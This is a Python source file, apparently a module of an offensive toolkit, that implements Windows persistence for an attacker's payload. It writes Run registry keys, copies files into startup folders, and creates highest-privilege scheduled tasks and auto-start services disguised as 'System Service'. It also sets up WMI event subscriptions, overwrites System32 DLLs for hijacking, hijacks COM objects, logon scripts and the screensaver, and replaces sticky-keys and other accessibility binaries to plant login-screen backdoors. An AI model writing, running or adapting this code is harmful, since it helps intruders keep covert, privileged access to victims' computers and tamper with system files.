#!/usr/bin/env python3
"""
Elite Persist Command - Advanced persistence mechanisms
Comprehensive persistence techniques for maintaining access
"""

import ctypes
from ctypes import wintypes
import subprocess
import os
import winreg
import tempfile
import shutil
import datetime

class ElitePersist:
    """Elite persistence mechanisms"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32
        
    def execute(self, method, payload_path=None, name=None, **kwargs):
        """Execute persistence mechanism"""
        try:
            if method == 'registry_run':
                return self._registry_run_persistence(payload_path, name)
            elif method == 'startup_folder':
                return self._startup_folder_persistence(payload_path, name)
            elif method == 'scheduled_task':
                return self._scheduled_task_persistence(payload_path, name, kwargs.get('trigger', 'logon'))
            elif method == 'service':
                return self._service_persistence(payload_path, name)
            elif method == 'wmi_event':
                return self._wmi_event_persistence(payload_path, name)
            elif method == 'dll_hijacking':
                return self._dll_hijacking_persistence(payload_path, kwargs.get('target_process'))
            elif method == 'com_hijacking':
                return self._com_hijacking_persistence(payload_path, kwargs.get('clsid'))
            elif method == 'logon_script':
                return self._logon_script_persistence(payload_path, name)
            elif method == 'screensaver':
                return self._screensaver_persistence(payload_path)
            elif method == 'accessibility':
                return self._accessibility_persistence(payload_path, kwargs.get('target', 'sethc'))
            elif method == 'list':
                return self._list_persistence_mechanisms()
            elif method == 'remove':
                return self._remove_persistence(kwargs.get('persistence_id'))
            else:
                return {
                    'success': False,
                    'error': f'Unknown method: {method}',
                    'available_methods': ['registry_run', 'startup_folder', 'scheduled_task', 'service', 'wmi_event', 'dll_hijacking', 'com_hijacking', 'logon_script', 'screensaver', 'accessibility', 'list', 'remove']
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Persistence operation failed: {str(e)}'
            }
    
    def _registry_run_persistence(self, payload_path, name):
        """Registry Run key persistence"""
        try:
            if not payload_path or not name:
                return {
                    'success': False,
                    'error': 'Payload path and name are required'
                }
            
            if not os.path.exists(payload_path):
                return {
                    'success': False,
                    'error': f'Payload file not found: {payload_path}'
                }
            
            # Registry locations for persistence
            registry_locations = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run")
            ]
            
            successful_locations = []
            failed_locations = []
            
            for hkey, reg_path in registry_locations:
                try:
                    key = winreg.CreateKey(hkey, reg_path)
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, payload_path)
                    winreg.CloseKey(key)
                    
                    root_name = "HKCU" if hkey == winreg.HKEY_CURRENT_USER else "HKLM"
                    successful_locations.append(f"{root_name}\\{reg_path}")
                    
                except Exception as e:
                    root_name = "HKCU" if hkey == winreg.HKEY_CURRENT_USER else "HKLM"
                    failed_locations.append({
                        'location': f"{root_name}\\{reg_path}",
                        'error': str(e)
                    })
            
            return {
                'success': len(successful_locations) > 0,
                'method': 'registry_run',
                'name': name,
                'payload_path': payload_path,
                'successful_locations': successful_locations,
                'failed_locations': failed_locations,
                'persistence_id': f"registry_run_{name}"
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Registry Run persistence failed: {str(e)}'
            }
    
    def _startup_folder_persistence(self, payload_path, name):
        """Startup folder persistence"""
        try:
            if not payload_path or not name:
                return {
                    'success': False,
                    'error': 'Payload path and name are required'
                }
            
            if not os.path.exists(payload_path):
                return {
                    'success': False,
                    'error': f'Payload file not found: {payload_path}'
                }
            
            # Startup folder locations
            startup_folders = [
                os.path.expandvars(r"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
                os.path.expandvars(r"%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            ]
            
            successful_copies = []
            failed_copies = []
            
            for startup_folder in startup_folders:
                try:
                    if os.path.exists(startup_folder):
                        # Create shortcut or copy payload
                        if payload_path.endswith('.exe'):
                            # Copy executable
                            dest_path = os.path.join(startup_folder, f"{name}.exe")
                            shutil.copy2(payload_path, dest_path)
                        else:
                            # Create batch file wrapper
                            dest_path = os.path.join(startup_folder, f"{name}.bat")
                            with open(dest_path, 'w') as f:
                                f.write(f'@echo off\\nstart "" "{payload_path}"\\n')
                        
                        successful_copies.append(dest_path)
                        
                except Exception as e:
                    failed_copies.append({
                        'folder': startup_folder,
                        'error': str(e)
                    })
            
            return {
                'success': len(successful_copies) > 0,
                'method': 'startup_folder',
                'name': name,
                'payload_path': payload_path,
                'successful_copies': successful_copies,
                'failed_copies': failed_copies,
                'persistence_id': f"startup_folder_{name}"
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Startup folder persistence failed: {str(e)}'
            }
    
    def _scheduled_task_persistence(self, payload_path, name, trigger):
        """Scheduled task persistence"""
        try:
            if not payload_path or not name:
                return {
                    'success': False,
                    'error': 'Payload path and name are required'
                }
            
            if not os.path.exists(payload_path):
                return {
                    'success': False,
                    'error': f'Payload file not found: {payload_path}'
                }
            
            # Create scheduled task based on trigger type
            if trigger == 'logon':
                schtasks_cmd = f'schtasks /create /tn "{name}" /tr "{payload_path}" /sc onlogon /rl highest /f'
            elif trigger == 'startup':
                schtasks_cmd = f'schtasks /create /tn "{name}" /tr "{payload_path}" /sc onstart /rl highest /f'
            elif trigger == 'daily':
                schtasks_cmd = f'schtasks /create /tn "{name}" /tr "{payload_path}" /sc daily /st 09:00 /rl highest /f'
            elif trigger == 'idle':
                schtasks_cmd = f'schtasks /create /tn "{name}" /tr "{payload_path}" /sc onidle /i 10 /rl highest /f'
            else:
                return {
                    'success': False,
                    'error': f'Unknown trigger type: {trigger}',
                    'available_triggers': ['logon', 'startup', 'daily', 'idle']
                }
            
            try:
                result = subprocess.run(schtasks_cmd, shell=True, capture_output=True, text=True, timeout=15)
                
                if result.returncode == 0:
                    # Verify task was created
                    query_cmd = f'schtasks /query /tn "{name}" /fo csv'
                    query_result = subprocess.run(query_cmd, shell=True, capture_output=True, text=True, timeout=5)
                    
                    return {
                        'success': True,
                        'method': 'scheduled_task',
                        'name': name,
                        'payload_path': payload_path,
                        'trigger': trigger,
                        'task_created': True,
                        'task_info': query_result.stdout,
                        'persistence_id': f"scheduled_task_{name}"
                    }
                else:
                    return {
                        'success': False,
                        'error': 'Failed to create scheduled task',
                        'stderr': result.stderr
                    }
                    
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'Scheduled task creation timed out'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Scheduled task persistence failed: {str(e)}'
            }
    
    def _service_persistence(self, payload_path, name):
        """Windows service persistence"""
        try:
            if not payload_path or not name:
                return {
                    'success': False,
                    'error': 'Payload path and name are required'
                }
            
            if not os.path.exists(payload_path):
                return {
                    'success': False,
                    'error': f'Payload file not found: {payload_path}'
                }
            
            # Create Windows service
            sc_create_cmd = f'sc create "{name}" binPath= "{payload_path}" start= auto'
            
            try:
                create_result = subprocess.run(sc_create_cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                if create_result.returncode == 0:
                    # Set service description
                    sc_desc_cmd = f'sc description "{name}" "System Service"'
                    subprocess.run(sc_desc_cmd, shell=True, capture_output=True, timeout=5)
                    
                    # Try to start the service
                    sc_start_cmd = f'sc start "{name}"'
                    start_result = subprocess.run(sc_start_cmd, shell=True, capture_output=True, text=True, timeout=10)
                    
                    return {
                        'success': True,
                        'method': 'service',
                        'name': name,
                        'payload_path': payload_path,
                        'service_created': True,
                        'service_started': start_result.returncode == 0,
                        'start_output': start_result.stdout,
                        'persistence_id': f"service_{name}"
                    }
                else:
                    return {
                        'success': False,
                        'error': 'Failed to create service',
                        'stderr': create_result.stderr
                    }
                    
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'Service creation timed out'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Service persistence failed: {str(e)}'
            }
    
    def _wmi_event_persistence(self, payload_path, name):
        """WMI event subscription persistence"""
        try:
            if not payload_path or not name:
                return {
                    'success': False,
                    'error': 'Payload path and name are required'
                }
            
            # PowerShell script for WMI event subscription
            ps_script = f'''
$filterName = "{name}_Filter"
$consumerName = "{name}_Consumer"
$payload = "{payload_path}"

# Create WMI Event Filter
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    Name = $filterName
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
}}

# Create WMI Event Consumer
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = $consumerName
    CommandLineTemplate = $payload
}}

# Bind Filter to Consumer
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = $filter
    Consumer = $consumer
}}

Write-Output "WMI Event Subscription Created: $filterName -> $consumerName"
'''
            
            try:
                result = subprocess.run(['powershell', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=30)
                
                success = result.returncode == 0 and 'Created:' in result.stdout
                
                return {
                    'success': success,
                    'method': 'wmi_event',
                    'name': name,
                    'payload_path': payload_path,
                    'filter_name': f"{name}_Filter",
                    'consumer_name': f"{name}_Consumer",
                    'output': result.stdout,
                    'error_output': result.stderr,
                    'persistence_id': f"wmi_event_{name}"
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'WMI event subscription timed out'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'WMI event persistence failed: {str(e)}'
            }
    
    def _dll_hijacking_persistence(self, payload_path, target_process):
        """DLL hijacking persistence"""
        try:
            if not payload_path or not target_process:
                return {
                    'success': False,
                    'error': 'Payload path and target process are required'
                }
            
            # Common DLL hijacking targets
            hijack_targets = {
                'explorer': {
                    'dll_name': 'version.dll',
                    'location': r'C:\\Windows\\System32'
                },
                'winlogon': {
                    'dll_name': 'winmm.dll',
                    'location': r'C:\\Windows\\System32'
                },
                'svchost': {
                    'dll_name': 'wlbsctrl.dll',
                    'location': r'C:\\Windows\\System32'
                }
            }
            
            target_info = hijack_targets.get(target_process.lower())
            if not target_info:
                return {
                    'success': False,
                    'error': f'Unknown target process: {target_process}',
                    'available_targets': list(hijack_targets.keys())
                }
            
            dll_path = os.path.join(target_info['location'], target_info['dll_name'])
            
            try:
                # Backup original DLL if it exists
                if os.path.exists(dll_path):
                    backup_path = f"{dll_path}.backup"
                    shutil.copy2(dll_path, backup_path)
                
                # Copy payload as hijacking DLL
                shutil.copy2(payload_path, dll_path)
                
                return {
                    'success': True,
                    'method': 'dll_hijacking',
                    'target_process': target_process,
                    'dll_name': target_info['dll_name'],
                    'dll_path': dll_path,
                    'payload_path': payload_path,
                    'backup_created': os.path.exists(f"{dll_path}.backup"),
                    'persistence_id': f"dll_hijack_{target_process}_{target_info['dll_name']}"
                }
                
            except PermissionError:
                return {
                    'success': False,
                    'error': f'Permission denied accessing {dll_path}. Administrator privileges required.'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'DLL hijacking persistence failed: {str(e)}'
            }
    
    def _com_hijacking_persistence(self, payload_path, clsid):
        """COM object hijacking persistence"""
        try:
            if not payload_path:
                return {
                    'success': False,
                    'error': 'Payload path is required'
                }
            
            # Default CLSID if not provided
            if not clsid:
                clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"  # MMDeviceEnumerator
            
            # Registry path for COM hijacking
            com_key_path = f"SOFTWARE\\Classes\\CLSID\\{clsid}\\InProcServer32"
            
            try:
                # Create registry entry for COM hijacking
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, com_key_path)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
                winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
                winreg.CloseKey(key)
                
                return {
                    'success': True,
                    'method': 'com_hijacking',
                    'clsid': clsid,
                    'payload_path': payload_path,
                    'registry_path': f"HKCU\\{com_key_path}",
                    'persistence_id': f"com_hijack_{clsid}"
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Failed to create COM hijacking registry entry: {str(e)}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'COM hijacking persistence failed: {str(e)}'
            }
    
    def _logon_script_persistence(self, payload_path, name):
        """Logon script persistence"""
        try:
            if not payload_path or not name:
                return {
                    'success': False,
                    'error': 'Payload path and name are required'
                }
            
            # Registry path for logon scripts
            logon_script_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Logon\\0\\0"
            
            try:
                # Create logon script registry entry
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, logon_script_path)
                winreg.SetValueEx(key, "Script", 0, winreg.REG_SZ, payload_path)
                winreg.SetValueEx(key, "Parameters", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "IsPowershell", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "ExecTime", 0, winreg.REG_QWORD, 0)
                winreg.CloseKey(key)
                
                return {
                    'success': True,
                    'method': 'logon_script',
                    'name': name,
                    'payload_path': payload_path,
                    'registry_path': f"HKCU\\{logon_script_path}",
                    'persistence_id': f"logon_script_{name}"
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Failed to create logon script entry: {str(e)}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Logon script persistence failed: {str(e)}'
            }
    
    def _screensaver_persistence(self, payload_path):
        """Screensaver persistence"""
        try:
            if not payload_path:
                return {
                    'success': False,
                    'error': 'Payload path is required'
                }
            
            # Registry path for screensaver
            screensaver_path = r"Control Panel\\Desktop"
            
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, screensaver_path)
                winreg.SetValueEx(key, "SCRNSAVE.EXE", 0, winreg.REG_SZ, payload_path)
                winreg.SetValueEx(key, "ScreenSaveActive", 0, winreg.REG_SZ, "1")
                winreg.SetValueEx(key, "ScreenSaveTimeOut", 0, winreg.REG_SZ, "600")  # 10 minutes
                winreg.CloseKey(key)
                
                return {
                    'success': True,
                    'method': 'screensaver',
                    'payload_path': payload_path,
                    'timeout_seconds': 600,
                    'registry_path': f"HKCU\\{screensaver_path}",
                    'persistence_id': f"screensaver_{os.path.basename(payload_path)}"
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Failed to set screensaver persistence: {str(e)}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Screensaver persistence failed: {str(e)}'
            }
    
    def _accessibility_persistence(self, payload_path, target):
        """Accessibility feature persistence (sticky keys, etc.)"""
        try:
            if not payload_path:
                return {
                    'success': False,
                    'error': 'Payload path is required'
                }
            
            # Accessibility targets
            accessibility_targets = {
                'sethc': r'C:\\Windows\\System32\\sethc.exe',      # Sticky Keys
                'utilman': r'C:\\Windows\\System32\\utilman.exe',  # Utility Manager
                'osk': r'C:\\Windows\\System32\\osk.exe',          # On-Screen Keyboard
                'narrator': r'C:\\Windows\\System32\\narrator.exe', # Narrator
                'magnify': r'C:\\Windows\\System32\\magnify.exe'   # Magnifier
            }
            
            target_path = accessibility_targets.get(target.lower())
            if not target_path:
                return {
                    'success': False,
                    'error': f'Unknown accessibility target: {target}',
                    'available_targets': list(accessibility_targets.keys())
                }
            
            try:
                # Backup original file
                backup_path = f"{target_path}.backup"
                if os.path.exists(target_path) and not os.path.exists(backup_path):
                    shutil.copy2(target_path, backup_path)
                
                # Replace with payload
                shutil.copy2(payload_path, target_path)
                
                return {
                    'success': True,
                    'method': 'accessibility',
                    'target': target,
                    'target_path': target_path,
                    'payload_path': payload_path,
                    'backup_created': os.path.exists(backup_path),
                    'persistence_id': f"accessibility_{target}",
                    'note': f'Trigger by pressing {target} key combination at login screen'
                }
                
            except PermissionError:
                return {
                    'success': False,
                    'error': f'Permission denied accessing {target_path}. Administrator privileges required.'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Accessibility persistence failed: {str(e)}'
            }
    
    def _list_persistence_mechanisms(self):
        """List active persistence mechanisms"""
        try:
            mechanisms = []
            
            # Check registry run keys
            run_locations = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
            ]
            
            for hkey, reg_path in run_locations:
                try:
                    key = winreg.OpenKey(hkey, reg_path)
                    i = 0
                    while True:
                        try:
                            name, value, type = winreg.EnumValue(key, i)
                            root_name = "HKCU" if hkey == winreg.HKEY_CURRENT_USER else "HKLM"
                            mechanisms.append({
                                'type': 'registry_run',
                                'name': name,
                                'value': value,
                                'location': f"{root_name}\\{reg_path}",
                                'persistence_id': f"registry_run_{name}"
                            })
                            i += 1
                        except OSError:
                            break
                    winreg.CloseKey(key)
                except Exception:
                    continue
            
            # Check scheduled tasks (simplified)
            try:
                result = subprocess.run(['schtasks', '/query', '/fo', 'csv'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\\n')[1:]  # Skip header
                    for line in lines:
                        if line.strip():
                            parts = line.split(',')
                            if len(parts) >= 2:
                                task_name = parts[0].strip('"')
                                if not task_name.startswith('\\Microsoft\\'):  # Skip system tasks
                                    mechanisms.append({
                                        'type': 'scheduled_task',
                                        'name': task_name,
                                        'status': parts[1].strip('"') if len(parts) > 1 else 'Unknown',
                                        'persistence_id': f"scheduled_task_{task_name}"
                                    })
            except Exception:
                pass
            
            # Check services (simplified)
            try:
                result = subprocess.run(['sc', 'query', 'state=', 'all'], 
                                      capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    service_blocks = result.stdout.split('SERVICE_NAME:')[1:]
                    for block in service_blocks[:10]:  # Limit to first 10
                        lines = block.strip().split('\\n')
                        if lines:
                            service_name = lines[0].strip()
                            mechanisms.append({
                                'type': 'service',
                                'name': service_name,
                                'persistence_id': f"service_{service_name}"
                            })
            except Exception:
                pass
            
            return {
                'success': True,
                'method': 'list',
                'total_mechanisms': len(mechanisms),
                'mechanisms': mechanisms,
                'scan_time': datetime.datetime.now().isoformat()
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to list persistence mechanisms: {str(e)}'
            }
    
    def _remove_persistence(self, persistence_id):
        """Remove specific persistence mechanism"""
        try:
            if not persistence_id:
                return {
                    'success': False,
                    'error': 'Persistence ID is required'
                }
            
            # Parse persistence ID
            parts = persistence_id.split('_', 2)
            if len(parts) < 2:
                return {
                    'success': False,
                    'error': 'Invalid persistence ID format'
                }
            
            method = parts[0] + '_' + parts[1]  # e.g., "registry_run"
            name = parts[2] if len(parts) > 2 else ""
            
            if method == 'registry_run':
                return self._remove_registry_run_persistence(name)
            elif method == 'scheduled_task':
                return self._remove_scheduled_task_persistence(name)
            elif method == 'service':
                return self._remove_service_persistence(name)
            else:
                return {
                    'success': False,
                    'error': f'Removal not implemented for method: {method}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to remove persistence: {str(e)}'
            }
    
    def _remove_registry_run_persistence(self, name):
        """Remove registry run persistence"""
        try:
            removed_locations = []
            failed_locations = []
            
            run_locations = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
            ]
            
            for hkey, reg_path in run_locations:
                try:
                    key = winreg.OpenKey(hkey, reg_path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    
                    root_name = "HKCU" if hkey == winreg.HKEY_CURRENT_USER else "HKLM"
                    removed_locations.append(f"{root_name}\\{reg_path}")
                    
                except FileNotFoundError:
                    # Value doesn't exist, which is fine
                    pass
                except Exception as e:
                    root_name = "HKCU" if hkey == winreg.HKEY_CURRENT_USER else "HKLM"
                    failed_locations.append({
                        'location': f"{root_name}\\{reg_path}",
                        'error': str(e)
                    })
            
            return {
                'success': len(removed_locations) > 0,
                'method': 'remove_registry_run',
                'name': name,
                'removed_locations': removed_locations,
                'failed_locations': failed_locations
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to remove registry run persistence: {str(e)}'
            }
    
    def _remove_scheduled_task_persistence(self, name):
        """Remove scheduled task persistence"""
        try:
            delete_cmd = f'schtasks /delete /tn "{name}" /f'
            
            result = subprocess.run(delete_cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            return {
                'success': result.returncode == 0,
                'method': 'remove_scheduled_task',
                'name': name,
                'output': result.stdout,
                'error_output': result.stderr
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to remove scheduled task: {str(e)}'
            }
    
    def _remove_service_persistence(self, name):
        """Remove service persistence"""
        try:
            # Stop service first
            stop_cmd = f'sc stop "{name}"'
            subprocess.run(stop_cmd, shell=True, capture_output=True, timeout=5)
            
            # Delete service
            delete_cmd = f'sc delete "{name}"'
            result = subprocess.run(delete_cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            return {
                'success': result.returncode == 0,
                'method': 'remove_service',
                'name': name,
                'output': result.stdout,
                'error_output': result.stderr
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to remove service: {str(e)}'
            }

def elite_persist(method, payload_path=None, name=None, **kwargs):
    """Elite persist command entry point"""
    persist_cmd = ElitePersist()
    return persist_cmd.execute(method, payload_path, name, **kwargs)